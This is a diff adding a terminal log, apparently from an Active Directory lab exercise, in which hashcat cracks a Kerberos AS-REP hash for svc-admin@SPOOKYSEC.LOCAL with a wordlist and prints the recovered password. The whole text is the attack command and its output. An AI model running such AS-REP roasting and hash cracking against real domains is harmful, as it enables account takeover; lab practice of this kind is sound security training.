@@ -1,0 +1,63 @@
+└─$ hashcat -m 18200 --force ./users_no_pre_authentication.txt samples/passwordlist.txt      
+hashcat (v6.2.5) starting
+
+You have enabled --force to bypass dangerous warnings and errors!
+This can hide serious problems and should only be done when debugging.
+Do not report hashcat issues encountered when using --force.
+
+OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
+=============================================================================================================================
+* Device #1: pthread-0x000, 1438/2940 MB (512 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory required for this attack: 0 MB
+
+Dictionary cache built:
+* Filename..: samples/passwordlist.txt
+* Passwords.: 70188
+* Bytes.....: 569236
+* Keyspace..: 70188
+* Runtime...: 0 secs
+
+$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:27bedd0aec67450f7bdfe982b32f7971$91c3399361b8c2945fa3013cae690bce8224fe96f30f867005e802b55c3d1cae63a2acb1c2a987c18cd9c7f84f40dcd3710acab9e960f3f63717f5fd64ab583c349df68e85e65f0909cae7a5b5f803f1a450ef2087b00bfc59c8fdc92fa4cabb3a08a68553d4df553eb783c53d72271f722224cc69818237cc518e630bd106022eb5666ce79e1acbd72c68314eea8aa0d7c0a62f44d80bb39b1eaa463744d6c019a36756cdfbf3c18e470282acd44d7dc0424b2178bd3eb0ba92b5a88b7ddee7061748ac4b42fa351c10b1cfd3f0fa5e877525cfa7f42d49a14206b4a5a7130a061fd70116c6b7c41bc02d6d7d7c2daed621:management2005
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
+Hash.Target......: $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:27bedd0aec6...aed621
+Time.Started.....: Wed Jun 22 13:06:05 2022, (0 secs)
+Time.Estimated...: Wed Jun 22 13:06:05 2022, (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (samples/passwordlist.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   769.6 kH/s (0.54ms) @ Accel:256 Loops:1 Thr:1 Vec:4
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 7168/70188 (10.21%)
+Rejected.........: 0/7168 (0.00%)
+Restore.Point....: 6144/70188 (8.75%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: horoscope -> frida
+
+Started: Wed Jun 22 13:05:53 2022
+Stopped: Wed Jun 22 13:06:07 2022
